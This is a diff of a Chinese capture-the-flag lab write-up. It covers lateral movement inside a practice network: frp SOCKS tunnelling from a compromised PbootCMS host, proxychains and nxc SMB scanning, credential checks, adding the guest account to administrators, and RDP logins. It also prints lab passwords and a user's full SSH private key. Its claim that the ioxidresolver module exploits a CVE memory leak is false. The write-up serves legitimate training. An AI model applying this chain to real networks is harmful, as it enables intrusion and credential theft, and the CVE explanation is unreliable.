@@ -273,9 +273,13 @@ net user guest /active:yes
 net localgroup administrators guest /add
 ```
 ## 搭建frp代理
-阿里云已经开放7000端口了，有防火墙还要再次执行`ufw allow 7000/tcp`
+阿里云入方向规则放行6000和7000端口，有防火墙还要再次执行
+```
+ufw allow 7000/tcp
+ufw allow 6000/tcp
+```
 
-### 阿里云服务端
+### frps-阿里云服务端
 ```bash
 ecs-user@iZuf6cpbx5hvqmv33pteu2Z /h/frp_0.65.0_linux_amd64> ./frps -c ./frps.toml
 2026-06-01 14:36:45.962 [I] [frps/root.go:108] frps uses config file: ./frps.toml
@@ -286,7 +290,7 @@ ecs-user@iZuf6cpbx5hvqmv33pteu2Z /h/frp_0.65.0_linux_amd64> ./frps -c ./frps.tom
 2026-06-01 14:36:53.215 [I] [server/control.go:399] [5aee9f15ef905c3b] new proxy [plugin_socks5] type [tcp] success
 ```
 
-### 靶机端（PBOOTCMS）
+### frpc-靶机端（PBOOTCMS）
 ```bash
 www-data@iZ8vbgyjachs4g5pjgaopzZ:/tmp$ chmod 777 ./frpc
 www-data@iZ8vbgyjachs4g5pjgaopzZ:/tmp$ chmod 777 ./frpc.toml
@@ -299,7 +303,224 @@ WARNING: ini format is deprecated and the support will be removed in the future,
 2026-06-01 14:36:53.228 [I] [client/control.go:172] [5aee9f15ef905c3b] [plugin_socks5] start proxy success
 ```
 
+### 一、先理清链路
 
+1. 阿里云（服务端）：`101.132.149.233:7000` 监听 FRP 连接
+2. 内网机器（FRP 客户端）：连接阿里云，映射 **Socks5 代理** 到阿里云 `6000` 端口
+3. 本地 Kali：需要连接 **阿里云公网 IP:6000** 走 Socks5 代理访问内网 `172.23.4.0/24`
+### 二、修改 proxychains4 配置
+1. 打开配置文件
+```bash
+nano /etc/proxychains4.conf
+```
+
+2. 配置项调整（必做）
+- 注释 `strict_chain`（保证代理容错）
+```ini
+# strict_chain
+```
+- 启用 `dynamic_chain`（推荐，自动切换链路）
+```ini
+dynamic_chain
+```
+- 拉到文件末尾，**替换原有代理行**，写入：
+```ini
+socks5  101.132.149.233  6000
+```
+
+### 三、FRP 两端配置核对（防止端口 / 类型错误）
+#### 1. 阿里云 frps.ini（服务端）
+
+确保配置允许转发，示例参考：
+```ini
+[common]
+bind_port = 7000
+# 如需Socks5穿透，无需额外插件配置，客户端映射即可
+```
+#### 2. 内网机器 frpc.ini（现有的客户端配置）
+当前配置：
+```ini
+[common]
+server_addr = 101.132.149.233
+server_port = 7000
+
+[plugin_socks5]
+type = tcp
+remote_port = 6000
+```
+✅ 配置无误：将**内网机器的 Socks5 代理**暴露到阿里云 `6000` 端口。
+
+> 补充：`plugin_socks5` 就是 FRP 内置 Socks5 插件，代理出口为**内网机器**，正好用来访问同网段 `172.23.4.0/24`。
+
+### 四、分层测试（从易到难，定位问题）
+
+#### 1. 本地 Kali 直连阿里云 6000 端口（基础连通性）
+```bash
+# 测试端口通不通
+telnet 101.132.149.233 6000
+```
+
+- 能进入交互界面 → 端口通
+- 超时 / 拒绝 → 检查：阿里云安全组放行 `6000/TCP`、frpc/frps 是否正常运行
+#### 2. 测试代理是否生效（看出口 IP）
+```bash
+proxychains4 curl ip.sb
+```
+
+- 输出 **阿里云 IP** → 代理正常
+- 报错 / 超时 → 回到第一步检查端口与 FRP 服务状态
+#### 3. 代理访问内网单 IP + 端口测试
+```bash
+# 测试内网主机连通性
+proxychains4 ping 172.23.4.32
+
+# 测试SMB核心端口 445
+proxychains4 telnet 172.23.4.32 445
+```
+
+### 五、扫描
+#### 1.挂上代理，扫描内网：
+```bash
+~  proxychains4 -q nxc smb 172.23.4.0/24
+SMB         172.23.4.51     445    iZzvg0io6q1o5hZ  [*] Windows Server 2022 Build 20348 x64 (name:iZzvg0io6q1o5hZ) (domain:iZzvg0io6q1o5hZ) (signing:False) (SMBv1:False)
+SMB         172.23.4.12     445    IZMN9U6ZO3VTRNZ  [*] Windows Server 2022 Build 20348 (name:IZMN9U6ZO3VTRNZ) (domain:pentest.me) (signing:False) (SMBv1:False)
+
+```
+
+#### 2.验证账户是否配置成功：
+```bash
+☁  ~  proxychains4 -q nxc smb 172.23.4.51 -u administrator -p 'abc123!@#'
+SMB         172.23.4.51     445    iZzvg0io6q1o5hZ  [*] Windows Server 2022 Build 20348 x64 (name:iZzvg0io6q1o5hZ) (domain:iZzvg0io6q1o5hZ) (signing:False) (SMBv1:False)
+SMB         172.23.4.51     445    iZzvg0io6q1o5hZ  [+] iZzvg0io6q1o5hZ\administrator:abc123!@# (Pwn3d!)
+```
+
+
+### 六、配置proxifier
+#### 1.配置proxies
+![](assets/file-20260601164049264.png)
+
+#### 2.配置rules
+![](assets/file-20260601163206432.png)
+
+
+### 七、启动远程连接
+#### 1.输入账号密码
+```ini
+administrator
+abc123!@#
+```
 
 ![](assets/file-20260529165531264.png)
+
+#### flag02
+![](assets/file-20260601163120003.png)
+
+```
+flag{Do_you_kown_oracle_rce?}
+```
+
+readme.txt
+![](assets/file-20260601164509668.png)
+
+```
+usera@pentest.me
+Admin3gv83
+```
+
+# flag03
+
+结合之前扫描结果和刚才的账号密码，登录`172.23.4.12`
+```
+SMB         172.23.4.12     445    IZMN9U6ZO3VTRNZ  [*] Windows Server 2022 Build 20348 (name:IZMN9U6ZO3VTRNZ) (domain:pentest.me) (signing:False) (SMBv1:False)
+```
+![](assets/file-20260601170539508.png)
+
+```
+flag{not_write_password_in_txt}
+```
+
+
+
+
+主机 PENTEST\IZMN9U6ZO3VTRNZ 存在 172.23.4.12/172.24.7.16 双网卡：
+```bash
+☁  ~  proxychains4 -q nxc smb 172.23.4.12 -M ioxidresolver
+SMB         172.23.4.12     445    IZMN9U6ZO3VTRNZ  [*] Windows Server 2022 Build 20348 x64 (name:IZMN9U6ZO3VTRNZ) (domain:pentest.me) (signing:False) (SMBv1:False)
+IOXIDRES... 172.23.4.12     445    IZMN9U6ZO3VTRNZ  Address: 172.23.4.12
+IOXIDRES... 172.23.4.12     445    IZMN9U6ZO3VTRNZ  Address: 172.24.7.16
+```
+这条命令是**渗透测试中常用的 SMB 协议信息收集命令**，核心作用是：**通过 proxychains4 代理隧道，对目标 SMB 服务执行 `ioxidresolver` 模块探测**。
+
+`ioxidresolver` 是 **CVE-2024-35240 漏洞利用 / 探测模块**（Windows SMB 服务远程内存泄漏漏洞）：
+- 无需认证
+- 无需密码
+- 可以**读取目标 SMB 服务的内存数据**
+- 常用于：内网信息泄露、凭证窃取、横向移动
+简单说：**这条命令是在代理下，无密码探测目标是否存在 CVE-2024-35240 漏洞，并尝试读取内存信息。**
+---
+
+### 在域用户 usera 的 ~/.ssh/ 目录，发现 ssh 私钥 id_rsa：
+```bash
+PS C:\Users\usera> ls ~/.ssh/
+
+
+    目录: C:\Users\usera\.ssh
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         2022/7/31     18:17           2622 id_rsa
+-a----         2022/7/31     18:17            584 id_rsa.pub
+-a----          2022/8/1     22:05            439 known_hosts
+-a----          2022/8/1     22:05            267 known_hosts.old
+
+
+PS C:\Users\usera> type ~/.ssh/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+```
+
+### known_hosts 文件中查看到两个 IP：
+```
+PS C:\Users\usera\.ssh> type .\known_hosts
+172.23.4.19 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFJJrccRyWXl3ukzzZQooQ1A/F1BhaBSJaZ7EaYbNKay7NB0NE7icsSZM63KcXKj5W5Fenhiz+JF7f4qyvzJpw4=
+172.24.7.23 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICEKSjuMy2Pn3h2NFxVRc+uJXBgoq8YHKBvC683+Na10
+172.24.7.23 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHhESiXRwVnqgTtADKek0fxSQKchkXn7evdU9uFiZ+R0zn9BVBAS1maIfyVAAh6H3wgN2mJ7zG3nvQE7cvKZ5xQ=
+```
 
